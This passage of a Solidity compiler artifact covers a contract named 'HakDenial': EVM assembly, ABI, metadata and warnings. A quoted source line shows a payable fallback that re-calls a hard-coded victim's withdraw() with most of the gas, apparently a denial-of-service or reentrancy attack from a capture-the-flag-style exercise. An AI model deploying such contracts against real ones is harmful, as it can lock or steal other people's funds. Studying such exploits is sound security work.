											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 296,
											"end": 301,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 296,
											"end": 301,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 284,
											"end": 301,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 284,
											"end": 301,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 284,
											"end": 294,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 284,
											"end": 301,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 284,
											"end": 301,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 284,
											"end": 301,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 276,
											"end": 302,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 276,
											"end": 302,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 276,
											"end": 302,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 276,
											"end": 302,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 276,
											"end": 302,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 276,
											"end": 302,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 276,
											"end": 302,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 394,
											"end": 399,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 394,
											"end": 399,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 394,
											"end": 399,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 394,
											"end": 399,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 372,
											"end": 401,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 372,
											"end": 401,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 372,
											"end": 401,
											"name": "SELFDESTRUCT",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 88,
											"end": 108,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 88,
											"end": 108,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 115,
											"end": 180,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 115,
											"end": 180,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 7,
											"end": 125,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 112,
											"end": 117,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 94,
											"end": 118,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "tag",
											"source": 1,
											"value": "37"
										},
										{
											"begin": 94,
											"end": 118,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 89,
											"end": 92,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 82,
											"end": 119,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 72,
											"end": 125,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 131,
											"end": 504,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 131,
											"end": 504,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 131,
											"end": 504,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 263,
											"end": 301,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 295,
											"end": 300,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 263,
											"end": 301,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 263,
											"end": 301,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 263,
											"end": 301,
											"name": "tag",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 263,
											"end": 301,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 317,
											"end": 405,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 398,
											"end": 404,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 393,
											"end": 396,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 317,
											"end": 405,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 317,
											"end": 405,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 317,
											"end": 405,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 317,
											"end": 405,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 310,
											"end": 405,
											"name": "SWAP4",
											"source": 1
										},
										{
											"begin": 310,
											"end": 405,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 414,
											"end": 466,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 459,
											"end": 465,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 454,
											"end": 457,
											"name": "DUP6",
											"source": 1
										},
										{
											"begin": 447,
											"end": 451,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 440,
											"end": 445,
											"name": "DUP7",
											"source": 1
										},
										{
											"begin": 436,
											"end": 452,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 414,
											"end": 466,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 414,
											"end": 466,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 414,
											"end": 466,
											"name": "tag",
											"source": 1,
											"value": "45"
										},
										{
											"begin": 414,
											"end": 466,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 491,
											"end": 497,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 486,
											"end": 489,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 482,
											"end": 498,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 475,
											"end": 498,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 475,
											"end": 498,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 239,
											"end": 504,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 510,
											"end": 781,
											"name": "tag",
											"source": 1,
											"value": "27"
										},
										{
											"begin": 510,
											"end": 781,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 510,
											"end": 781,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 662,
											"end": 755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 751,
											"end": 754,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 742,
											"end": 748,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 662,
											"end": 755,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 662,
											"end": 755,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 662,
											"end": 755,
											"name": "tag",
											"source": 1,
											"value": "48"
										},
										{
											"begin": 662,
											"end": 755,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 655,
											"end": 755,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 655,
											"end": 755,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 772,
											"end": 775,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 765,
											"end": 775,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 765,
											"end": 775,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 644,
											"end": 781,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 644,
											"end": 781,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 644,
											"end": 781,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 644,
											"end": 781,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 644,
											"end": 781,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 787,
											"end": 1009,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 787,
											"end": 1009,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 787,
											"end": 1009,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 918,
											"end": 920,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 907,
											"end": 916,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 903,
											"end": 921,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 895,
											"end": 921,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 895,
											"end": 921,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 931,
											"end": 1002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 999,
											"end": 1000,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 988,
											"end": 997,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 984,
											"end": 1001,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 975,
											"end": 981,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 931,
											"end": 1002,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 931,
											"end": 1002,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 931,
											"end": 1002,
											"name": "tag",
											"source": 1,
											"value": "50"
										},
										{
											"begin": 931,
											"end": 1002,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 885,
											"end": 1009,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 885,
											"end": 1009,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 885,
											"end": 1009,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 885,
											"end": 1009,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 885,
											"end": 1009,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1015,
											"end": 1113,
											"name": "tag",
											"source": 1,
											"value": "42"
										},
										{
											"begin": 1015,
											"end": 1113,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1015,
											"end": 1113,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1100,
											"end": 1105,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1094,
											"end": 1106,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1084,
											"end": 1106,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1084,
											"end": 1106,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1073,
											"end": 1113,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1073,
											"end": 1113,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1073,
											"end": 1113,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1073,
											"end": 1113,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1119,
											"end": 1266,
											"name": "tag",
											"source": 1,
											"value": "44"
										},
										{
											"begin": 1119,
											"end": 1266,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1119,
											"end": 1266,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1257,
											"end": 1260,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1242,
											"end": 1260,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1242,
											"end": 1260,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1232,
											"end": 1266,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 1232,
											"end": 1266,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1232,
											"end": 1266,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1232,
											"end": 1266,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1232,
											"end": 1266,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1272,
											"end": 1368,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1272,
											"end": 1368,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1272,
											"end": 1368,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1338,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1356,
											"end": 1361,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1338,
											"end": 1362,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1338,
											"end": 1362,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 1338,
											"end": 1362,
											"name": "tag",
											"source": 1,
											"value": "54"
										},
										{
											"begin": 1338,
											"end": 1362,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1362,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1327,
											"end": 1362,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1317,
											"end": 1368,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1317,
											"end": 1368,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1317,
											"end": 1368,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1317,
											"end": 1368,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1374,
											"end": 1500,
											"name": "tag",
											"source": 1,
											"value": "55"
										},
										{
											"begin": 1374,
											"end": 1500,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1374,
											"end": 1500,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1451,
											"end": 1493,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 1444,
											"end": 1449,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1440,
											"end": 1494,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 1429,
											"end": 1494,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1429,
											"end": 1494,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1419,
											"end": 1500,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1419,
											"end": 1500,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1419,
											"end": 1500,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1419,
											"end": 1500,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 1506,
											"end": 1813,
											"name": "tag",
											"source": 1,
											"value": "46"
										},
										{
											"begin": 1506,
											"end": 1813,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1574,
											"end": 1575,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "tag",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1598,
											"end": 1604,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1595,
											"end": 1596,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1592,
											"end": 1605,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1683,
											"end": 1684,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 1678,
											"end": 1681,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1674,
											"end": 1685,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1668,
											"end": 1686,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 1664,
											"end": 1665,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1659,
											"end": 1662,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1655,
											"end": 1666,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1648,
											"end": 1687,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1620,
											"end": 1622,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1617,
											"end": 1618,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1613,
											"end": 1623,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1623,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1608,
											"end": 1623,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "58"
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "tag",
											"source": 1,
											"value": "60"
										},
										{
											"begin": 1584,
											"end": 1697,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1715,
											"end": 1721,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1712,
											"end": 1713,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1709,
											"end": 1722,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 1706,
											"end": 1708,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 1706,
											"end": 1708,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1706,
											"end": 1708,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 1795,
											"end": 1796,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1786,
											"end": 1792,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1781,
											"end": 1784,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 1777,
											"end": 1793,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1770,
											"end": 1797,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1706,
											"end": 1708,
											"name": "tag",
											"source": 1,
											"value": "61"
										},
										{
											"begin": 1706,
											"end": 1708,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1813,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1813,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1813,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1813,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1555,
											"end": 1813,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"daVic()": "f787e039",
							"deny()": "a3fdfee3",
							"kill()": "41c0e1b5",
							"owner()": "8da5cb5b"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.2+commit.661d1103\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"payable\",\"type\":\"fallback\"},{\"inputs\":[],\"name\":\"daVic\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deny\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/HakDenial.sol\":\"HakDenial\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/HakDenial.sol\":{\"keccak256\":\"0x35216e91f1c67d8577c46a22e558ecf2cbfd649633907ed39cd4c84169e63bd7\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://d0eee82ca082baeb9ef7ad0a78e16ba908ddd8ee89673e1b9a5c109986715ebf\",\"dweb:/ipfs/Qmf6kD8sRiNcG6iHt6ex1psthENpC11GVVQ5w5uv6HeTdu\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "contracts/HakDenial.sol:HakDenial",
								"label": "owner",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							},
							{
								"astId": 6,
								"contract": "contracts/HakDenial.sol:HakDenial",
								"label": "daVic",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "3628",
				"formattedMessage": "Warning: This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.\n --> contracts/HakDenial.sol:4:1:\n  |\n4 | contract HakDenial{\n  | ^ (Relevant source part starts here and spans across multiple lines).\nNote: The payable fallback function is defined here.\n  --> contracts/HakDenial.sol:23:5:\n   |\n23 |     fallback() external payable{\n   |     ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "This contract has a payable fallback function, but no receive ether function. Consider adding a receive ether function.",
				"secondarySourceLocations": [
					{
						"end": 579,
						"file": "contracts/HakDenial.sol",
						"message": "The payable fallback function is defined here.",
						"start": 527
					}
				],
				"severity": "warning",
				"sourceLocation": {
					"end": 584,
					"file": "contracts/HakDenial.sol",
					"start": 57
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> contracts/HakDenial.sol:21:9:\n   |\n21 |         daVic.call{gas:7900000}(abi.encodeWithSignature('withdraw()'));\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 513,
					"file": "contracts/HakDenial.sol",
					"start": 451
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contracts/HakDenial.sol": {
				"ast": {
					"absolutePath": "contracts/HakDenial.sol",
					"exportedSymbols": {
						"HakDenial": [
							62
						]
					},
					"id": 63,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "31:22:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 62,
							"linearizedBaseContracts": [
								62
							],
							"name": "HakDenial",
							"nameLocation": "66:9:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "8da5cb5b",
									"id": 3,
									"mutability": "mutable",
									"name": "owner",
									"nameLocation": "103:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 62,
									"src": "88:20:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 2,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "88:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"functionSelector": "f787e039",
									"id": 6,
									"mutability": "mutable",
									"name": "daVic",
									"nameLocation": "130:5:0",
									"nodeType": "VariableDeclaration",
									"scope": 62,
									"src": "115:65:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 4,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "115:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307832306666393342336337393535423035364234664141613432434437303543433438376545383134",
										"id": 5,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "138:42:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0x20ff93B3c7955B056B4fAAa42CD705CC487eE814"
									},
									"visibility": "public"
								},
								{
									"body": {
										"id": 14,
										"nodeType": "Block",
										"src": "202:37:0",
										"statements": [
											{
												"expression": {
													"id": 12,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 9,
														"name": "owner",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "213:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"expression": {
															"id": 10,
															"name": "msg",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 4294967281,
															"src": "221:3:0",
															"typeDescriptions": {
